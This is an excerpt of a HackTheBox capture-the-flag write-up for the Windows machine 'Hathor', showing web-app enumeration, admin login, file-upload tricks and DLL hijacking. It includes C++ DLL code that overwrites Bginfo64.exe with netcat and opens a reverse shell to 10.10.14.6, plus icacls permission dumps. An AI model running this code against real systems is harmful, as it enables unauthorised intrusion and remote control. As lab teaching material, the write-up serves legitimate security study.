[HTB: Hathor](/2022/11/19/htb-hathor.html)

![Hathor](https://0xdfimages.gitlab.io/img/hathor-cover.webp)
...
[![Hathor](/icons/box-hathor.webp)](https://hackthebox.com/machines/hathor)

[Hathor](https://hackthebox.com/machines/hathor)
...
Rated Difficulty ![Rated difficulty for Hathor](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/hathor-diff.webp)

Radar Graph ![Radar chart for Hathor](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/hathor-radar.webp)

User

03:37:04 Root

03:39:44 Creator ## Recon
...
It is interesting that the last error message is `STATUS_NOT_SUPPORTED`. This typically means that NTLM auth is disabled (like in [Scrambled](about:/2022/10/01/htb-scrambled-linux.html#kerberoast)).
...
![image-20221108152554825](https://0xdfimages.gitlab.io/img/image-20221108152554825.webp)

The “Login” link at the bottom right leads to `http://hathor.windcorp.htb/Secure/Login.aspx?returnurl=%2f`, and shows a form:

![image-20221108152633710](https://0xdfimages.gitlab.io/img/image-20221108152633710.webp)

The “Recover Password” link provides a form, and offers a chance to enumerate user:

![image-20221108152718535](https://0xdfimages.gitlab.io/img/image-20221108152718535.webp)

The “Create Account” link leads to another form, which I’ll fill out:

![image-20221108152815270](https://0xdfimages.gitlab.io/img/image-20221108152815270.webp)

On submitting, it works, and I’m logged in. The site is very sparse, though there is a Member List page:

![image-20221108152929718](https://0xdfimages.gitlab.io/img/image-20221108152929718.webp)
...
![image-20221108162954403](https://0xdfimages.gitlab.io/img/image-20221108162954403.webp)
...
![image-20221108164010197](https://0xdfimages.gitlab.io/img/image-20221108164010197.webp)

#### Login

Entering those creds works to log in as the admin user:

![image-20221108164821657](https://0xdfimages.gitlab.io/img/image-20221108164821657.webp)
...
![image-20221109075953053](https://0xdfimages.gitlab.io/img/image-20221109075953053.webp)
...
![image-20221109082001429](https://0xdfimages.gitlab.io/img/image-20221109082001429.webp)
...
![image-20221109081204186](https://0xdfimages.gitlab.io/img/image-20221109081204186.webp)
...
![image-20221109081436703](https://0xdfimages.gitlab.io/img/image-20221109081436703.webp)
...
![image-20221109081754377](https://0xdfimages.gitlab.io/img/image-20221109081754377.webp)
...
![image-20221109081818386](https://0xdfimages.gitlab.io/img/image-20221109081818386.webp)

Trying “Rename” gives a similar error as when trying to upload (from the server, not client-side):

![image-20221109081847652](https://0xdfimages.gitlab.io/img/image-20221109081847652.webp)

The POST body shows it tries the new path, but the response shows it’s not allow:

![image-20221109082857519](https://0xdfimages.gitlab.io/img/image-20221109082857519.webp)
...
![image-20221109085802849](https://0xdfimages.gitlab.io/img/image-20221109085802849.webp)

This looks successful:

![image-20221109090027260](https://0xdfimages.gitlab.io/img/image-20221109090027260.webp)

The file doesn’t show up in the File Manager, but it is there:

![image-20221109090141012](https://0xdfimages.gitlab.io/img/image-20221109090141012.webp)

### Shell

#### Fails

A bunch of the things I try with PowerShell fail. For example, trying PowerShell #3 (Base64) from [https://www.revshells.com/](https://www.revshells.com/) returns a message that it’s blocked by AV:

![image-20221109093055716](https://0xdfimages.gitlab.io/img/image-20221109093055716.webp)
...
![image-20221109092913967](https://0xdfimages.gitlab.io/img/image-20221109092913967.webp)
...
![image-20221109121557571](https://0xdfimages.gitlab.io/img/image-20221109121557571.webp)

But `net user web` does:

![image-20221109121627700](https://0xdfimages.gitlab.io/img/image-20221109121627700.webp)
...
![](https://www.youtube.com/watch?v=w_Kro3S4xE8)
...
![image-20221109123606820](https://0xdfimages.gitlab.io/img/image-20221109123606820.webp)
...
![image-20221109122318968](https://0xdfimages.gitlab.io/img/image-20221109122318968.webp)
...
![image-20221109131039749](https://0xdfimages.gitlab.io/img/image-20221109131039749.webp)
...
I’ve written my own DLL a few times before. The most detailed writeup I have is from [HackBack](about:/2019/07/06/htb-hackback.html#dll). I’ll follow the same process here. I’ll open my Windows VM and Visual Studio. I’ll create a new project, filtering for C++ and selecting “Dynamic-Link Library (DLL)” as the type:
...
![image-20221110073913824](https://0xdfimages.gitlab.io/img/image-20221110073913824.webp)
...
case DLL_PROCESS_ATTACH:
    ...
    system("cmd.exe /c icacls C:\\\\* >> C:\\users\\public\\0xdf.txt");
    system("cmd.exe /c icacls C:\\\\scripts\\* >> C:\\users\\public\\0xdf.txt");
    system("cmd.exe /c ping 10.10.14.6");
```
...
![image-20221110134404933](https://0xdfimages.gitlab.io/img/image-20221110134404933.webp)
...
![image-20221110134740278](https://0xdfimages.gitlab.io/img/image-20221110134740278.webp)
...
![image-20221110134923892](https://0xdfimages.gitlab.io/img/image-20221110134923892.webp)
...
```cpp
case DLL_PROCESS_ATTACH:
    system("cmd.exe /c takeown /F C:\\\\Bginfo64.exe");
    system("cmd.exe /c cacls C:\\\\Bginfo64.exe /E /G ginawild:F");
    system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\\\Bginfo64.exe");
    system("cmd.exe /c C:\\\\Bginfo64.exe -e cmd 10.10.14.6 9003");
```
...
- The subject is `DC = htb, DC = windcorp, CN = Users, CN = Administrator`. This matches what was in the AppLocker data above for Exe (not shown) and Script: ![image-20221110154222397](https://0xdfimages.gitlab.io/img/image-20221110154222397.webp)
